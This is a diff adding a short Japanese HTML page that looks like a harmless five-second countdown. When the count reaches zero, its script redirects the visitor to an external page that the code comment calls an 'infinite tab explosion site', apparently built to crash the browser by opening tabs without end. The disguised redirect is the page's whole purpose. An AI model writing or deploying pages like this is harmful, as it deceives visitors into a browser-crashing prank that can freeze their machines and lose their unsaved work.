@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8" />
+  <title>5秒カウントダウンサイト</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      margin-top: 100px;
+      font-size: 2em;
+    }
+  </style>
+</head>
+<body>
+  <h1>運命のカウントダウン！ <span id="count">5</span> 秒</h1>
+
+  <script>
+    let count = 5;
+    const counter = document.getElementById('count');
+
+    const interval = setInterval(() => {
+      count--;
+      counter.textContent = count;
+      if (count === 0) {
+        clearInterval(interval);
+        // ここで無限タブ爆増サイトにジャンプ！
+        window.location.href = "https://niccorin.github.io/Error-BrowserCrush/";
+      }
+    }, 1000);
+  </script>
+</body>
+</html>
